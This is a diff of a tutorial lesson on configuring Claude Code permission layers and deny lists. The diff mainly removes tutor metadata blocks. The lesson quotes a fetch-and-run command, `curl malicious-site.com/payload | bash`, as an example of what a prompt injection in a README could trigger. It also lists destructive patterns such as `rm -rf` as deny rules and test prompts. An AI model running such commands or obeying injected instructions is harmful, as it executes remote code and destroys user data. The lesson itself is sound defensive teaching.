@@ -5,7 +5,6 @@ chapterNumber: "11.3"
 pathNumber: "11"
 tutorPreload: "Help me configure Claude Code so it cannot run destructive commands or access files outside my project."
 verifyType: "terminal_output"
-stepSchemaVersion: 1
 ---
 
 # Set permission boundaries for Claude Code
@@ -18,8 +17,6 @@ By the end of this lesson you will configure Claude Code's permission system to 
 
 ### Step 1 — Understand the permission layers
 
-<StepMeta purpose="Build the mental model for how Claude Code permissions are layered and enforced." action="Read the global, project, and session-level permission layers and note that a tool must be allowed at every layer to work." expectedResult="You can explain how global settings, project settings, and session flags combine to form the effective permission boundary." whyItMatters="If you do not understand the layering, it is easy to assume a session flag can override a global deny or that project settings protect more than they really do." nextStep="Inspect or create the global settings file so you can start applying broad machine-level guardrails." askTutor="I'm on Step 1 of Set permission boundaries for Claude Code. Help me understand how these three permission layers combine so I know where to put each kind of restriction." />
-
 Claude Code's permissions work in three layers, from broadest to narrowest:
 
 | Layer | File | Scope | Who controls it |
@@ -31,8 +28,6 @@ Claude Code's permissions work in three layers, from broadest to narrowest:
 A tool must be allowed at every layer to work. If global settings block `bash(rm)`, no project or session can override that.
 
 ### Step 2 — Find or create your global settings file
-
-<StepMeta purpose="Locate the machine-wide settings file that controls the broadest Claude Code safety policy." action="Create the ~/.claude directory if needed, ensure settings.json exists, and inspect its current contents before editing it." expectedResult="You have a visible global settings file ready for machine-wide deny rules." whyItMatters="Global settings are the right place for universal safety boundaries because they follow you across every project and session on the machine." nextStep="Add deny rules for obviously dangerous command patterns so those operations are blocked everywhere by default." askTutor="I'm on Step 2 of Set permission boundaries for Claude Code. Help me inspect this global settings file and decide what belongs here versus in project-level settings." />
 
 **macOS / Linux**
 
@@ -55,8 +50,6 @@ if (Test-Path "$HOME\.claude\settings.json") {
 ```
 
 ### Step 3 — Add command restrictions to global settings
-
-<StepMeta purpose="Establish broad deny rules for command patterns that should never be casually executable." action="Write the global deny list for destructive deletes, unsafe chmod, remote pipe-to-shell commands, eval, and raw disk access, then reopen the file to verify it." expectedResult="Your global settings.json contains explicit deny patterns for high-risk shell operations." whyItMatters="Machine-wide deny rules reduce the chance that a prompt injection or careless request turns into catastrophic shell execution across any repo." nextStep="Layer project-specific allows and denies on top so the current repo only grants the tools and commands it actually needs." askTutor="I'm on Step 3 of Set permission boundaries for Claude Code. Help me review this deny list and decide whether these patterns are broad enough without blocking normal work I still need." />
 
 Edit the settings file to block dangerous shell patterns globally. These restrictions apply to every project.
 
@@ -107,8 +100,6 @@ The `*` is a wildcard — `bash(curl * | bash)` blocks any command matching that
 > **Real danger:** Without command restrictions, Claude Code can run any shell command your user account has access to. A prompt injection in a README or documentation file could trick Claude into executing `curl malicious-site.com/payload | bash`. Deny-listing dangerous patterns is a critical safety layer.
 
 ### Step 4 — Add project-level restrictions
-
-<StepMeta purpose="Constrain the current repo to a narrower set of tools and commands than the global machine policy alone provides." action="Create .claude/settings.json in the project with explicit allow and deny lists tailored to the commands this project actually needs." expectedResult="The repo now has a committed project-level permission policy that documents which tools are permitted and which command patterns are blocked." whyItMatters="Project-level policy is what translates abstract safety principles into a practical least-privilege setup for the current codebase." nextStep="Launch a restricted Claude session with session flags so you can see how the narrowest layer affects the tools available right now." askTutor="I'm on Step 4 of Set permission boundaries for Claude Code. Help me narrow this project allow list so it stays useful without giving Claude unnecessary shell reach." />
 
 Create a project-level settings file that allows only the tools this project needs.
 
@@ -178,8 +169,6 @@ Get-Content ".claude\settings.json"
 
 ### Step 5 — Restrict Claude to a specific directory scope
 
-<StepMeta purpose="Practice applying the narrowest, session-only restrictions on top of the broader policies." action="Launch Claude with --allowedTools and inspect which tools remain available in that session." expectedResult="Claude reports only the explicitly allowed tools and command patterns for the current session." whyItMatters="Session flags are useful when you want a temporary least-privilege mode for a risky task without editing the long-term settings files." nextStep="Try a denied command inside Claude to prove the restrictions are real and not just documentation." askTutor="I'm on Step 5 of Set permission boundaries for Claude Code. Help me understand when I should use a session-scoped --allowedTools restriction instead of editing the project settings file." />
-
 Use the `--allowedTools` flag at launch time to limit what Claude can access in a session.
 
 **macOS / Linux**
@@ -200,8 +189,6 @@ Claude will report that it can only read files, write files, and run Python comm
 
 ### Step 6 — Verify the restrictions work
 
-<StepMeta purpose="Test the policy in practice so you know the deny rules block real requests instead of only looking correct in JSON." action="Ask Claude to run a clearly denied command and confirm it refuses because the pattern matches the deny list." expectedResult="Claude rejects the destructive command instead of executing it." whyItMatters="A permission policy is only trustworthy if you validate it with a real blocked action, especially for the commands you most want to prevent." nextStep="Document the policy rationale in a markdown file so teammates can review and maintain the same boundary set." askTutor="I'm on Step 6 of Set permission boundaries for Claude Code. Help me verify that this refusal actually proves the permission policy is working the way I intended." />
-
 Test that a blocked command is actually denied. In your Claude Code session, try asking:
 
 ```
@@ -211,8 +198,6 @@ Run: rm -rf ~/important-project
 Claude should refuse because `bash(rm -rf *)` is in the deny list. If you are using the project-level settings from Step 4, Claude will also refuse `sudo` commands and piped `curl` commands.
 
 ### Step 7 — Document your permission policy
-
-<StepMeta purpose="Make the permission boundary visible and reviewable for the team instead of leaving it as hidden JSON only." action="Write .claude/PERMISSIONS.md describing the allowed operations, denied operations, and rationale for the policy." expectedResult="The repo includes a human-readable permission policy that explains the intent behind the allow and deny lists." whyItMatters="Readable policy documentation helps teams maintain guardrails over time and makes it easier to review whether restrictions still match the project's risk profile." nextStep="Apply both execution sandboxing and permission boundaries in the final mini-project where you assemble a full safe execution pipeline." askTutor="I'm on Step 7 of Set permission boundaries for Claude Code. Help me write this permissions policy so teammates understand both the rules and the reasoning behind them." />
 
 Save your permission decisions in a file your team can review.
 
